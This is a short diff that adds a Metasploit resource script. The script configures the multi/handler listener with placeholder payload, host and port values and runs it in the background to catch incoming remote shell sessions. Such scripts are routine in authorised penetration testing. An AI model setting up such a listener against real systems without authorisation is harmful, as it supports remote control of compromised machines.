@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set PAYLOAD aaa
+set LHOST bbb
+set LPORT ccc
+set ExitOnSession false
+exploit -j -z
